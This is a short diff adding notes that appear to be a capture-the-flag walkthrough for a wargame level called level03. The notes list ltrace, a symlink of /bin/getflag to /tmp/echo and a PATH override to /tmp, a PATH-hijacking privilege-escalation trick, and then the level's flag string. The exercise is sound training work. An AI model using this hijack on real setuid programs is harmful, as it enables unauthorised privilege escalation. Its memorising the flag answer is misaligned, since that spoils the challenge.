@@ -1,0 +1,4 @@
+- `ltrace level03`
+- `ln -s /bin/getflag /tmp/echo`
+- `export PATH=/tmp`
+- flag03: `qi0maab88jeaj46qoumi7maus`
